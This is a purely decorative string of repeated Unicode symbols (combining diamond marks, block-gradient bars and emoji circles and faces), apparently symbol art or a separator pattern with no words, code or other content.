⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔴▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔵▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔵▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔵▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔵▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂😶▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂😶▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂😶▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟